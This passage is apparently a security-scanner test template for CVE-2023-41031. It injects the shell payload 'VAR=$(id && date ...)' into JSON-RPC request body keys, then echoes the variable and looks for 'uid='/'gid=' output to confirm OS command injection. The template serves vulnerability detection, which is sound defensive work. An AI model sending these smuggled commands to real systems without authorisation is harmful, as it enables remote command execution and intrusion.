  - CVE-2023-41031
attributes:
  nature: INTRUSIVE
  plan: PRO
  duration: FAST
api_selection_filters:
  response_code:
    gte: 200
    lt: 300
  method:
    eq: POST
  response_payload:
    length:
      gt: 0
    not_contains:
    - Error
    - Internal Server
    - Failed
    - Unauthorized
    - access denied
    - Forbidden
    - Method Not allowed
    - Gateway timeout
    - request timeout
    - server error
    - server busy
    - authentication error
    - authorization error
    - validation error
    - Permission Denied
    - invalid token
    - token expired
    - session expired
    - session timeout
    - unexpected error
    - unable to process request
    - bad request
    - service unavailable
    - account is locked
    - account is blocked
    - multiple failed attempts
  request_payload:
    contains_all:
    - jsonrpc
    - method
    - id
    for_one:
      key:
        regex: ^(?!id|params|method|jsonrpc|name)
        extract: changed_body_key
      value:
        extract: changed_body_value
wordLists:
  specialOSPayloads:
  - VAR=$(id && date +"%d-%B-%Y")
execute:
  type: multiple
  requests:
  - req:
    - modify_body_param:
        changed_body_key: ${specialOSPayloads}
    - validate:
        and:
        - response_code:
            gte: 200
            lt: 300
        - response_payload:
            length:
              gt: 0
            not_contains:
            - Error
            - fail
            - invalid
            - expired
            - not found
            - account is locked
            - account is blocked
            - rate-limit
            - rate_limit
            - rate limit
            - multiple failed attempt
            - <html>
            - </html>
    - success: x2
    - failure: exit
  - req:
    - modify_body_param:
        changed_body_key: echo $VAR
    - validate:
        response_payload:
          length:
            gt: 0
          contains_all:
          - uid=
          - gid=
          - groups=
          contains_either:
          - -January-
          - -February-
          - -March-
          - -April-
          - -May-
          - -June-
          - -July-
          - -August-
          - -September-
          - -October-
          - -November-
          - -December-
          not_contains:
          - Error
          - Internal Server
          - Failed
          - Unauthorized
          - access denied
          - Forbidden
          - Method Not allowed
          - Gateway timeout
          - request timeout
          - server error
          - server busy
          - authentication error
          - authorization error
          - validation error
          - Permission Denied
          - invalid token
          - token expired
          - session expired
          - session timeout
          - unexpected error
          - unable to process request
          - bad request
          - service unavailable
          - account is locked
          - account is blocked
          - multiple failed attempts
          - <html>
          - </html>
